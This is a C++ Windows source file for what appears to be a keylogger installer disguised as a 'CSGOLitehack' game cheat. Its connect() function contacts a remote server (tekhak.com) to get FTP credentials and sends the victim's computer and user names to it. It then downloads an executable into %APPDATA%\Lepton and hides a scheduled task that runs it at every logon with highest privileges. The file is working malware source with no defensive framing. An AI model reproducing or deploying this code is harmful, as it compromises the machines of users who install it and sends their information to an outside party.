#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "keylog.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Strsafe.h>
#include <tchar.h>
#include <fstream>
#include <Shlwapi.h>
#include <wininet.h> //for uploadFile function
#pragma comment(lib, "Shlwapi.lib")
#pragma comment (lib,"wininet.lib")

#define DEFAULT_BUFLEN 256
#define DEFAULT_PORT "430"

static char currentVers[10];
static char ftpDomain[24];
static char ftpUsername[24];
static char ftpPassword[24];
static char updateDir[24];
static char ipAddress[24];
static char computerName[24];
static char username[24];

void connect() {
	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return;
	}

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	struct hostent *he = gethostbyname("SERVER");
	if (he == NULL)
		he = gethostbyname("tekhak.com");
	char *addr = inet_ntoa(*((struct in_addr *) he->h_addr_list[0]));
	//std::cout << addr << std::endl;
	iResult = getaddrinfo(addr, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;
	ptr = result;
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return;
	}

	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return;
	}

	//--INITIALIZATION DATA--
	int recvbuflen = DEFAULT_BUFLEN;
	char recvbuf[DEFAULT_BUFLEN];

	iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
	if (iResult > 0) {
		int i = 0;
		while (recvbuf[i] != ' ') {
			currentVers[i] = recvbuf[i];
			i++;
		}
		currentVers[i] = 0;

		int j = 0;
		while (recvbuf[j + i + 1] != ' ') {
			ftpDomain[j] = recvbuf[j + i + 1];
			j++;
		}
		ftpDomain[j] = 0;

		int a = 0;
		while (recvbuf[a + j + i + 2] != ' ') {
			ftpUsername[a] = recvbuf[a + j + i + 2];
			a++;
		}
		ftpUsername[a] = 0;

		int b = 0;
		while (recvbuf[b + a + j + i + 3] != ' ') {
			ftpPassword[b] = recvbuf[b + a + j + i + 3];
			b++;
		}
		ftpPassword[b] = 0;

		int c = 0;
		while (recvbuf[c + b + a + j + i + 4] != ' ') {
			updateDir[c] = recvbuf[c + b + a + j + i + 4];
			c++;
		}
		updateDir[c] = 0;

		int d = 0;
		while (recvbuf[d + c + b + a + j + i + 5] != ' ') {
			ipAddress[d] = recvbuf[d + c + b + a + j + i + 5];
			d++;
		}
		ipAddress[d] = 0;
	}
	else if (iResult < 0) {
		printf("recv failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		return;
	}
	//do {
	//} while (iResult > 0);

	DWORD nameBufSize = 24;
	GetComputerName(computerName, &nameBufSize);
	DWORD username_len = 24;
	GetUserName(username, &username_len);
	strcpy_s(recvbuf, "CSGOLitehack");
	strcat_s(recvbuf, " ");
	strcat_s(recvbuf, computerName);
	strcat_s(recvbuf, " ");
	strcat_s(recvbuf, username);
	strcat_s(recvbuf, " ");

	iResult = send(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		printf("Failed to communicate: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return;
	}

	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();
}

bool FileGet() {
	HINTERNET hInternet;
	HINTERNET hFtpSession;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet != NULL)
	{
		hFtpSession = InternetConnect(hInternet, ftpDomain, INTERNET_DEFAULT_FTP_PORT, ftpUsername, ftpPassword, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (hFtpSession != NULL)
		{
			char pathway[MAX_PATH] = { 0 };
			char* appdataPath = getenv("APPDATA");
			strcat_s(pathway, appdataPath);
			strcat_s(pathway, "\\Lepton\\Lepton.exe");
			if (FtpGetFile(hFtpSession, updateDir, pathway, false, 0, FTP_TRANSFER_TYPE_BINARY, 0))
				return true;
		}
	}
	return false;
}

void Keylog::install() {
	char pathway[MAX_PATH] = { 0 };
	char* appdataPath = getenv("APPDATA");
	strcat_s(pathway, appdataPath);
	strcat_s(pathway, "\\Lepton");
	if (CreateDirectory(pathway, NULL) || ERROR_ALREADY_EXISTS == GetLastError())
	{
		strcat_s(pathway, "\\Lepton.exe");
		if (!PathFileExists(pathway)) {
			connect();
			if (FileGet()) {
				TCHAR szCmd[2 * MAX_PATH];
				STARTUPINFO si = { 0 };
				PROCESS_INFORMATION pi = { 0 };
				
				char command[255];
				strcpy_s(command, "Schtasks / CREATE / TN \"Lepton System\" /TR \"");
				strcat_s(command, pathway);
				strcat_s(command, "\" /F /SC ONLOGON /RL HIGHEST");

				StringCbPrintf(szCmd, 2 * MAX_PATH, TEXT(command));
				CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
			}
		}
	}
}